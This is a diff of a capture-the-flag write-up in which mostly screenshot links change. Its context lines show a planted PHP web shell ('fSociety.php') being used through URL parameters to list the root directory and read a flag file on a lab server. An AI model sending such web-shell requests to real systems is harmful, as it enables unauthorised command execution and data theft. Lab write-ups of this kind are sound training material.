@@ -147,15 +147,12 @@ Given that we have write permissions, let write some malicious code on the serve
  
             https://154.57.164.78:32157/fSociety.php?0=ls%20/
 
-<img width="1002" height="345" alt="rootDir" src="https://github.com/user-attachments/assets/38d16ccd-c39d-4350-a942-75e149d5d831" />
-
-<img width="821" height="261" alt="root" src="https://github.com/user-attachments/assets/486c3687-68a1-4007-850b-e7a75d4a1f4b" />
-
+<img width="1002" height="337" alt="root" src="https://github.com/user-attachments/assets/28763b2b-0977-447c-8cc9-8fa4176f5733" />
 
 - The file "flag_876a4c.txt", looks interesting, lets read it.
 
         https://154.57.164.78:32157/fSociety.php?0=cat%20/flag_876a4c.txt
 
-<img width="1002" height="345" alt="flag" src="https://github.com/user-attachments/assets/1d4b3426-376d-4dd4-acea-3dc415873d36" />
+<img width="1002" height="337" alt="flag" src="https://github.com/user-attachments/assets/c13edf33-619f-4eff-bdeb-87570750e68b" />
 
 - And with that, we've got the flag!
